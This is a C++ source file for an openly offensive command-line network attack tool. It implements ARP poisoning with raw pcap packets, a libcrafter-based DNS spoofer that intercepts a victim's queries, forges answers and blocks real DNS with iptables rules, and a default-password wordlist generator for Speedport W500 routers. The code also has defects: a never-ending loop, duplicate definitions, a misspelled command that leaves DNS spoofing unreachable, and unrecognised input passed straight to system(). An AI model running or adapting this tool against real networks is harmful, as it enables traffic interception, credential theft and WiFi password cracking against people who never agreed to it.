/* ================================================
 * Maintainer: Deltax
 * Date: 2017-11-11
 * Purpose: Main file
 *
 * Changelog:
 * V1: - fix bad code
 *     - update types
 *     - add dnsspoofer
 * ================================================
 */

// Optimized libaries
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <boost/tokenizer.hpp>
#include <readline/readline.h>
#include <readline/history.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <pcap.h>
#include <crafter.h>
#include <signal.h>
#include <map>

// Custom libaries
#include "color.h"


using namespace std;
using namespace Crafter;
using namespace boost;

/*
 * ================================================
 * Main Help file
 * Print all arguement and is the help desk
 * ================================================
 */
void help() {
    cout << "\033[2J\033[1;1H"
         << "------------- < Friendly > --------------\n"
         << BOLD << "\nMisc\n" << RESET
         << "Help \033[31m:\033[0m\t\t\t help \n"
         << "Quit \033[31m:\033[0m\t\t\t quit\n"

         << BOLD << "\nSet options\n" << RESET
         << "Set ssid \033[31m:\033[0m\t\t set_ssid\n"
         << "Set bssid \033[31m:\033[0m\t\t set_bssid\n"
         << "Set channel \033[31m:\033[0m\t\t set_channel\n"
         << "Set Gateway \033[31m:\033[0m\t\t set_gateway_ip\n"
         << "Set Target IP \033[31m:\033[0m\t\t set_target_ip\n"
         << "Set interface  \033[31m:\033[0m\t set_interface\n"

         << BOLD << "\nShow commands\n" << RESET
         << "Show Modules \033[31m:\033[0m\t\t show_modules\n"
         << "Show Settings \033[31m:\033[0m\t\t show_settings\n"
         << "Show Help \033[31m:\033[0m\t\t show_help\n"

         << BOLD << "\nAttack modules\n" << RESET
         << "Arp poisoning \033[31m:\033[0m\t\t arp_poison\n"
         << "Generate wordlist \033[31m:\033[0m\t gen_speedport_w500\n"
         << "---------------- < MAN > ----------------\n\n"
         << BOLD << "\nMisc\n" << RESET
         << GREEN << "Help: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " show_help:\n"
         << "\t[" << GREEN << "+" << RESET "]"
         << " help:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Print the help manual \n\n"

         << GREEN << "Quit: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " quit:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Quit with 0 \n\n"

         << BOLD << "\n\nSet options\n" << RESET
         << GREEN << "set_ssid: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " set_ssid [string]:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << "Set ssid \n\n"

         << GREEN << "set_bssid: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " set_bssid [string]:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << "Set bssid \n\n"

         << GREEN << "set_channel: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " set_channel [int]:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << "Set channel \n\n"

         << GREEN << "set_gateway_ip: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " set_gateway_ip [string:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << "Set channel \n\n"

         << GREEN << "set_target_ip: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " set_target_ip [int]:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << "Set target ip for arp poisoning \n\n"

         << GREEN << "set_gateway_ip: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " set_gateway_ip [int]:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << "Set gateway ip for arp poisoning \n\n"

         << BOLD << "\n\nShow options\n" << RESET << GREEN << "List Modules: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " show_modules:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Print all modules \n\n"

         << GREEN << "Show help: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " show_help:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Print the help manual \n\n"

         << GREEN << "Show settings: \n"
         << RESET << RED << " ~ " << RESET << BOLD << " Arguments:\n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " show_settings:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Print all settings which are in use \n\n"

         << BOLD << "\n\nAttack options\n" << RESET
         << GREEN << "Arp poisoning: \n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " arp_poison:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Arp_poison clients in a network \n\n"

         << GREEN << "Generate wordlists: \n"
         << RESET << "\t[" << GREEN << "+" << RESET "]"
         << " gen_speedport_w500:\n\n"
         << RED << " ~ " << RESET << BOLD << "Description:\n"
         << RESET << " Generate speed port wordlist for the speedsport w500 \n\n"
         << "---------------- < MAN > ----------------\n\n";
}

/*
 * ================================================
 *  ARP Spoofing main
 * ================================================
 */

void arp_main(const char *interface, const char *target_ip, const char *gateway_ip) {
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
    pcap_t *handle;
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 mask;
    bpf_u_int32 net;
    struct pcap_pkthdr *header;

    int res;
    const u_char *pkt;
    u_char send_pkt[42];
    struct tm *ltime;
    char timestr[16];
    time_t local_tv_sec;

    struct ether_header *eth;
    struct ether_arp *arp;

    char senderIP[16];
    char senderMAC[18];
    char targetMAC[18];

    FILE *fp2;

    fp2 = popen("ifconfig | grep -A3 \"192.\" | sed -n 1p | awk '{print $2}'", "r");
    if (nullptr == fp2) {
        perror("popen() 실패");
    }

    while (fgets(senderIP, 17, fp2));
    pclose(fp2);

    fp2 = popen("ifconfig | grep -A3 \"192.\" | sed -n 3p | awk '{print $2}'", "r");
    if (nullptr == fp2) {
        perror("popen() 실패");
    }

    while (fgets(senderMAC, 19, fp2));
    pclose(fp2);

    cout << GREEN << BOLD << "Arp spoofing:\n" << RESET
         << RESET << RED << " ~ " << RESET << BOLD << "Target IP: " << target_ip
         << "\n"
         << RESET << RED << " ~ " << RESET << BOLD << "Mac: " << RESET << senderMAC
         << RESET << RESET << RED << " ~ " << RESET << BOLD
         << "Gateway IP: " << RESET << gateway_ip << endl
         << RESET << RESET << RED << " ~ " << RESET << BOLD
         << "Device: " << RESET << interface << endl;

    dev = pcap_lookupdev(errbuf);
    if (dev == nullptr) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Couldn't find default device:\n";
        exit(1);
    }
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Couldn't get netmask for device\n";
        mask = 0;
        exit(1);
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Couldn't open device\n";
        exit(1);
    }

    /* Make packet to send ARP to Target */
    eth = (struct ether_header *) send_pkt;
    ether_aton_r("FF:FF:FF:FF:FF:FF", (struct ether_addr *) eth->ether_dhost);
    ether_aton_r(senderMAC, (struct ether_addr *) eth->ether_shost);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp = (struct ether_arp *) (send_pkt + ETH_HLEN);
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETHER_ADDR_LEN;
    arp->arp_pln = sizeof(struct in_addr);
    arp->arp_op = htons(ARPOP_REQUEST);
    ether_aton_r(senderMAC, (struct ether_addr *) arp->arp_sha);
    cout << "\n Sequenz: ";
    for (int i = 0; i < 6; i++) printf("%02x ", *(arp->arp_sha + i));
    printf("\n");
    inet_pton(AF_INET, target_ip, arp->arp_spa);

    ether_aton_r("00:00:00:00:00:00", (struct ether_addr *) arp->arp_tha);
    inet_pton(AF_INET, target_ip, arp->arp_tpa);

    if (pcap_sendpacket(handle, send_pkt, sizeof(send_pkt)) == -1) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Error\n";
        exit(1);
    }

    while ((res = pcap_next_ex(handle, &header, &pkt)) >= 0) {

        if (res == 0)
            continue;

        local_tv_sec = header->ts.tv_sec;
        ltime = localtime(&local_tv_sec);

        strftime(timestr, sizeof timestr, "%H:%M:%S", ltime);
        cout << RESET << "[" << GREEN << "I" << RESET << "] " << "Header " << BLUE << header->ts.tv_usec << RESET
             << " Lenght: " << RED << header->len << RESET << endl;

        eth = (struct ether_header *) pkt;
        arp = (struct ether_arp *) (pkt + ETH_HLEN);

        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            sprintf(targetMAC, "%s", ether_ntoa(((ether_addr *) arp->arp_sha)));
            break;
        }
    }

    eth = (struct ether_header *) send_pkt;
    ether_aton_r(targetMAC, (struct ether_addr *) eth->ether_dhost);
    ether_aton_r(senderMAC, (struct ether_addr *) eth->ether_shost);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp = (struct ether_arp *) (send_pkt + ETH_HLEN);
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETHER_ADDR_LEN;
    arp->arp_pln = sizeof(struct in_addr);
    arp->arp_op = htons(ARPOP_REPLY);
    ether_aton_r(senderMAC, (struct ether_addr *) arp->arp_sha);

    inet_pton(AF_INET, gateway_ip, arp->arp_spa);
    ether_aton_r(targetMAC, (struct ether_addr *) arp->arp_tha);
    inet_pton(AF_INET, target_ip, arp->arp_tpa);

    // Send packets
    pcap_sendpacket(handle, send_pkt, sizeof(send_pkt)) == -1 ? cout << RESET << "\n[" << RED << "-" << RESET << "]"
                                                                     << " Well we have a problem\n"
                                                              : cout << RESET << "\n[" << GREEN << "+" << RESET << "]"
                                                                     << " Spoofing sucessfull\n";
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");


}

// Display settings
void show_settings(const string &bssid, string ssid, const string channel, const string &interface);

// Main completion function
static char **completion(const char *, int);

char *generate(const char *, int);

char *dupstr(char *);

void *xmalloc(int);

// Here are stored all custom commands for completion
const char *cmd[] = {
        "show_modules",
        "show_help",
        "set_bssid",
        "set_ssid",
        "arp_poison",
        "dns_spoof",
        "set_gateway_ip",
        "set_target_ip",
        "set_dns_ip",
        "set_channel",
        "set_interface",
        "show_settings",
        "gen_speedport_w500",
        "clear",
        "clear_buff",
        "help",
        "quit",
        0};

// Def readline size
void *xmalloc(int size) {
    void *buffer;

    buffer = malloc(size);
    if (!buffer) {
        fprintf(stderr, "Error: Out of memory. Exiting.'n");
        exit(1);
    }

    return buffer;
}

char *dupstr(char *s) {
    char *r;

    r = (char *) xmalloc((strlen(s) + 1));
    strcpy(r, s);
    return (r);
}

char *generate(const char *text, int state) {
    static size_t len;
    static size_t list_index;
    const char *name;

    if (!state) {
        list_index = 0;
        len = strlen(text);
    }

    while ((name = cmd[list_index])) {
        list_index++;

        if (strncmp(name, text, len) == 0)
            return (dupstr((char *) name));
    }

    return ((char *) nullptr);

}


void *xmalloc(size_t size) {
    void *buffer;

    buffer = malloc(size);
    if (!buffer) {
        fprintf(stderr, "Error: Out of memory. Exiting.'n");
        exit(1);
    }

    return buffer;
}

void show_settings(const string &bssid, string ssid, const string channel, const string &interface);

void
show_settings(const string &bssid, string ssid, const string channel, const string &interface) {
    cout << GREEN << "Settings: \n"
         << RESET << RED << " ~ " << RESET << BOLD << "BSSID: " << bssid
         << "\n"
         << RESET << RESET << RED << " ~ " << RESET << BOLD
         << "SSID: " << ssid << endl
         << RESET << RESET << RED << " ~ " << RESET << BOLD
         << "CHANNEL: " << channel << endl
         << RESET << RESET << RED << " ~ " << RESET << BOLD
         << "INTERFACE: " << interface << endl
         << RESET;
}

char **completion(const char *text, int start, int end) {
    char **matches;

    matches = (char **) nullptr;

    if (start == 0)
        matches = rl_completion_matches((char *) text, &generate);
    else
        rl_bind_key('\t', rl_abort);

    return (matches);

}

// print modules may helpfull for the future
void show_modules() {
    cout << GREEN << BOLD << "Modules:\n" << RESET
         << "[Arp spoofing]" << GREEN << "... working\n" << RESET
         << "[Gen wordlist]" << GREEN << "... working\n" << RESET;
}

// Just to make the code not ugly
int convert2ascii(char c) {
    int a = c;
    return a;
}

/*
 * ================================================
 * Generate Wordlist
 * Vendor: w500
 * ================================================
 */

void gen_speedport_w500(string ssid, string bssid) {
    string temp;
    ofstream a;
    a.open("../wordlist/speedport-w500.txt");
    for (int i = 9; i <= 12; i++) {
        temp += bssid[i];
    }
    for (int x = 0; x < 10; ++x) {
        for (int y = 0; y < 10; ++y) {
            for (int z = 0; z < 10; ++z) {
                a << "SP-" << ssid[9] << z << ssid[10] << convert2ascii(bssid[8]) << convert2ascii(bssid[9])
                  << convert2ascii(bssid[10]) << x << y << z << convert2ascii(ssid[6]) << convert2ascii(ssid[7])
                  << "\n";
            }
        }
    }
    a.close();
}

/*
 * ================================================
 * DNS Spoof Module
 * ================================================
 */
struct HostInfo {
    string iface;
    string dns_ip;
    string victim_ip;
    string dns_mac;
    string victim_mac;
    string my_mac;
};

map <string, string> spoof_list;

void DNSSpoofer(Packet *sniff_packet, void *user);

void iptables_block(const string &iface, const string &victim_ip, int dst_port);

void iptables_flush(const string &iface, const string &victim_ip, int dst_port);

// Global pointer to Sniffer
Sniffer *sniff;

// Catch control C
void ctrl_c(int d) {
    /* Cancel the sniffing thread */
    sniff->Cancel();
}

void DNSSpoofer(Packet *sniff_packet, void *user) {
    using namespace std;
    using namespace Crafter;

    /* Cast the MAC addresses structure */
    HostInfo *host_data = static_cast<HostInfo *>(user);

    /* Get the Ethernet Layer */
    Ethernet *ether_layer = GetEthernet(*sniff_packet);

    /* Get the IP layer */
    IP *ip_layer = GetIP(*sniff_packet);

    /* Get the UDP layer */
    UDP *udp_layer = GetUDP(*sniff_packet);

    /* Flag to set when we should spoof a DNS answer */
    int spoof = 0;

    /* Checks if the source MAC is not mine */
    if (ether_layer->GetSourceMAC() != host_data->my_mac) {

        /* Checks if the packet is coming from the victim... */
        if (ip_layer->GetSourceIP() == host_data->victim_ip) {

            /* Get the RawLayer */
            RawLayer *raw_layer = GetRawLayer(*sniff_packet);

            /* Create a DNS header */
            DNS dns_req;
            /* And decode it from a raw layer */
            dns_req.FromRaw(*raw_layer);

            /* Check if the DNS packet is a query and there is a question on it... */
            if ((dns_req.GetQRFlag() == 0) && (dns_req.Queries.size() > 0)) {
                /* Get the host name to be resolved */
                string hostname = dns_req.Queries[0].GetName();

                /* Print information */
                cout << "[@] Query received -> Host Name = " << hostname << endl;

                /* Iterate the spoof_list */
                map<string, string>::iterator it_list;
                for (it_list = spoof_list.begin(); it_list != spoof_list.end(); it_list++) {

                    /* Get the name on the list */
                    string code_name = (*it_list).first;

                    /* Check if the code_name is inside the host name requested */
                    if (hostname.find(code_name) != string::npos) {

                        cout << "[+] ---- Spoofed request (" << code_name << ") -> Host Name = " << hostname << endl;

                        /* Get the IP address associated to this code_name */
                        string ip_address = (*it_list).second;
                        /* Create the DNS Answer */
                        DNS::DNSAnswer dns_answer(hostname, ip_address);
                        /* And put it into the container */
                        dns_req.Answers.push_back(dns_answer);

                        /* Modify the original request */
                        dns_req.SetQRFlag(1); /* Now is a response */
                        dns_req.SetRAFlag(1); /* Recursion is available */

                        /* Set the spoof flag */
                        spoof = 1;
                        /* Break the loop */
                        break;
                    }
                }
            }

            /* Send the spoofed answer */
            if (spoof) {
                /* Pop the top layer... */
                sniff_packet->PopLayer();
                /* ... and put the DNS spoof answer just created */
                *sniff_packet /= dns_req;

                /* +++++ Ethernet Layer */

                /* Send the packet to the victim */
                ether_layer->SetDestinationMAC(host_data->victim_mac);
                /* And put our MAC ad a source */
                ether_layer->SetSourceMAC(host_data->my_mac);

                /* Get DNS server IP address */
                string dns_ip = ip_layer->GetDestinationIP();

                /* Send the packet to the victim IP */
                ip_layer->SetDestinationIP(host_data->victim_ip);
                /* PUt the dns IP address as a source IP */
                ip_layer->SetSourceIP(dns_ip);


                /* +++++ UDP Layer */

                /* Swap the destinations and source port */
                short_word src_port = udp_layer->GetSrcPort();
                short_word dst_port = udp_layer->GetDstPort();
                udp_layer->SetSrcPort(dst_port);
                udp_layer->SetDstPort(src_port);

                /* After modifying the layers, write the packet on the wire */
                sniff_packet->Send(host_data->iface);
                //sniff_packet->HexDump();
            } else {

                /* Send the packet to the dns */
                ether_layer->SetDestinationMAC(host_data->dns_mac);
                /* And put our MAC ad a source */
                ether_layer->SetSourceMAC(host_data->my_mac);
                /* After modifying the Ethernet layer, write the packet on the wire */
                sniff_packet->Send(host_data->iface);

            }


            /* ...or coming from the server  */
        } else if (ip_layer->GetDestinationIP() == host_data->victim_ip) {

            /* Send the packet to the victim */
            ether_layer->SetDestinationMAC(host_data->victim_mac);
            /* And put our MAC ad a source */
            ether_layer->SetSourceMAC(host_data->my_mac);

            /* After modifying the Ethernet layer, write the packet on the wire */
            sniff_packet->Send(host_data->iface);
        }

    }

}

void iptables_block(const string &iface, const string &victim_ip, int dst_port) {
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");

    system(string("/sbin/iptables  -A FORWARD -s " + victim_ip +
                  " -p udp --dport " + StrPort(dst_port) + " -j DROP").c_str());
    system(string("/sbin/iptables -A FORWARD -d " + victim_ip +
                  " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());
}

void iptables_flush(const string &iface, const string &victim_ip, int dst_port) {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
    system(string("/sbin/iptables -D FORWARD -s " + victim_ip +
                  " -p udp --dport " + StrPort(dst_port) + " -j DROP").c_str());
    system(string("/sbin/iptables -D FORWARD -d " + victim_ip +
                  " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());
}

void dns_spoof_main(string iface, string dns_ip, string victim_ip) {
    using namespace std;
    using namespace Crafter;

    InitCrafter();

    /* Set the interface */

    /* Create a structure with information about the attack */
    HostInfo *host_info = new HostInfo;

    /* IP addresses -> This is a data supply by the user */
    short_word dst_port = 53; /* DNS traffic */

    /* List of addresses -> This also is data supplied by the user */
    spoof_list["proxy"] = "3.3.3.3";

    /* Create a HostInfo structure */
    host_info->iface = iface;
    host_info->dns_ip = dns_ip;
    host_info->victim_ip = victim_ip;
    host_info->dns_mac = GetMAC(dns_ip, iface);
    host_info->victim_mac = GetMAC(victim_ip, iface);
    host_info->my_mac = GetMyMAC(iface);

    /* Before the attack, execute the IPTABLES "script" */
    iptables_block(iface, victim_ip, dst_port);

    /* Start the ARP spoofing */
    ARPContext *context = ARPSpoofingReply(dns_ip, victim_ip, iface);

    /* Print data about the spoofing, and wait a few seconds */
    PrintARPContext(*context);
    sleep(3);

    /* Create a sniffer	*/
    sniff = new Sniffer("udp and host " + victim_ip + " and port " + StrPort(dst_port), iface, DNSSpoofer);

    /* Now, spawn the capture */
    void *sniffer_arg = static_cast<void *>(host_info);
    sniff->Spawn(-1, sniffer_arg);

    cout << "[@] Spawning the sniffer, redirecting the traffic... " << endl;

    /* Set a signal catcher */
    signal(SIGINT, ctrl_c);

    /* And wait for the sniffer to finish (when CONTROL-C is pressed) */
    sniff->Join();

    /* Delete the IP tables rules */
    iptables_flush(iface, victim_ip, dst_port);

    /* Delete allocated data */
    delete host_info;

    /* Clean up ARP context */
    CleanARPContext(context);

    /* Clean up library stuff... */
    CleanCrafter();

}

// ============================================================================================
// Manage input
// ============================================================================================
void read_user_input() {

    // Used as a command input
    char *buffer;
    buffer = nullptr;
    bool menu = true;

    // string to compare values
    string option;

    float v = 1.0;
    vector <string> SET;

    // ===========================================
    // fill with random data
    // ===========================================
    for (int i = 0; i <= 10; i++)
        SET.emplace_back("Not found");
    // (0) BSSID
    // (1) SSSID

    // completion using tab
    rl_attempted_completion_function = completion;

    // clear display and print banner
    cout << "\033[2J\033[1;1H" << BLUE << BOLD
         << "    o             o  ,-  ,- \n"
         << ",-: . ;-. ,-. ;-. .  |   |      ;-. ,-: \n"
         << "| | | |   `-. | | |  |-  |- --- | | | | \n"
         << "`-` ' '   `-' ' ' '  |   |      ' ' `-| \n"
         << "                    -'  -'          `-' "
         << RESET << "(" << v << ")\n";

    // we read history to memory
    read_history("commands/airplay-ng.history");
    while (menu = true) {

        // Read input with custom design
        buffer = readline("\033[31m>\033[34m>\033[0m ");

        // add command to buffer
        add_history(buffer);
        write_history("commands/airplay-ng.history");

        // char to string
        string command(buffer);

        // Trim last whitespaces
        size_t last = command.find_last_not_of(' ');
        command = command.substr(0, (last + 1));

        // split command into the first and secound command
        boost::char_separator<char> sep(" ");
        typedef boost::tokenizer <boost::char_separator<char>> t_tokenizer;
        t_tokenizer tok(command, sep);

        // Only print the first argument
        for (t_tokenizer::iterator beg = tok.begin(); beg != tok.end();) {
            option = *beg;
            break;
        }

        // Custom completion with tab
        rl_bind_key('\t', rl_complete);

        // ===========================================
        // Menu
        // ===========================================

        // hopefully I find a better way to parse arguments
        if (option == "help" || option == "show_help")
            help();
        else if (option == "show_modules")
            show_modules();
        else if (option == "quit")
            exit(0);
        else if (option == "set_bssid")
            SET.at(0) = command.erase(0, 10);
        else if (option == "set_channel")
            SET.at(1) = command.erase(1, 12);
        else if (option == "set_ssid")
            SET.at(2) = command.erase(0, 9);
        else if (option == "set_target_mac")
            SET.at(4) = command.erase(0, 12);
        else if (option == "set_interface")
            SET.at(3) = command.erase(0, 14);
        else if (option == "set_target_ip")
            SET.at(5) = command.erase(0, 14);
        else if (option == "set_gateway_ip")
            SET.at(6) = command.erase(0, 15);
        else if (option == "set_dns_ip")
            SET.at(7) = command.erase(0, 11);
        else if (option == "arp_poison")
            arp_main(SET.at(3).c_str(), SET.at(5).c_str(), SET.at(6).c_str());
        else if (option == "show_settings")
            show_settings(SET.at(0), SET.at(2), SET.at(1), SET.at(3));
        else if (option == "dns_sppof")
            dns_spoof_main(SET.at(3), SET.at(7), SET.at(4));
        else if (option == "clear")
            cout << "\033[2J\033[1;1H";
        else if (option == "clear_buff")
            free(buffer);
        else if (option == "stop")
            menu = false;
        else if (option == "gen_speedport_w500")
            gen_speedport_w500(SET.at(0), SET.at(2));
        else if (!option.empty())
            system(command.c_str());

        // ===========================================
        // Menu
        // ===========================================
        // Write to buffer
        add_history(buffer);
    }
    // clear buffer after exit the while loop
    free(buffer);
}

int main() {
    read_user_input();
    return 0;
}
